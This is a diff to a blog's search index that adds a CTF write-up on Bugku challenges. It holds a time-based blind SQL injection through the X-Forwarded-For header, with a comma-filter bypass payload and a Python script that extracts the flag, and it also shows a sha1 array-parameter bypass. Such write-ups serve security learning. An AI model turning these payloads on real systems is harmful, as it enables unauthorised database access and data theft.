@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[WP-Bugku-INSERT INTO注入]]></title>
+    <url>%2F2018%2F08%2F19%2FWriteup%2FWP-Bugku-INSERT%20INTO%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; &#125;$ip_arr = explode(',', $ip);return $ip_arr[0];&#125;$host="localhost";$user="";$pass="";$db="";$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");mysql_select_db($db) or die("Unable to select database");$ip = getIp();echo 'your ip is :'.$ip;$sql="insert into client_ip (ip) values ('$ip')";mysql_query($sql); 这是X_FORWARDED_FOR注入，但是过滤了,在,被过滤的情况下，无法使用if语句当然在mysql下除了if还有1select case when xxx then xxx else xxx end; 而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下111'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))%23 python 脚本12345678910111213141516171819import requestsimport string mystring = string.ascii_letters+string.digitsurl='http://120.24.86.145:8002/web15/'data = "127.0.0.1'+(select case when (substring((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 1 end) and '1'='1" #这里的&#123;&#125;对应的是后面所需要的formatflag = ''for i in range(1,35): for j in mystring: try: headers = &#123;'x-forwarded-for':data.format(str(i),j)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += j print flag breakprint 'The final flag:'+flag 这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。 得到 flag{cdbf14c9551d5be5612f7bb5d2867853}]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Bugku</tag>
+        <tag>X_FORWARDED_FOR注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[WP-Bugku-各种绕过]]></title>
     <url>%2F2018%2F08%2F18%2FWriteup%2FWP-Bugku-%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%2F</url>
     <content type="text"><![CDATA[题目地址http://120.24.86.145:8002/web7/ 源码12345678910111213141516171819 &lt;?phphighlight_file('flag.php');$_GET['id'] = urldecode($_GET['id']);$flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;';if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!';&#125;?&gt; 分析后发现，只要使uname的sha1和值与passwd的sha1的值相等即可， 但是同时他们两个的值又不能相等 那么构造数组get传参：?uname[]=1&amp;id=margin同时post传参：passwd[]=2 得到 flag{HACK_45hhs_213sDD} 这个和之前的前女友有点像，都是利用数组]]></content>
@@ -298,8 +311,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>Web</tag>
         <tag>sqlmap</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -311,8 +324,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>SQL</tag>
         <tag>Web</tag>
+        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
@@ -337,8 +350,8 @@
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>SQL</tag>
         <tag>Web</tag>
+        <tag>SQL</tag>
       </tags>
   </entry>
   <entry>
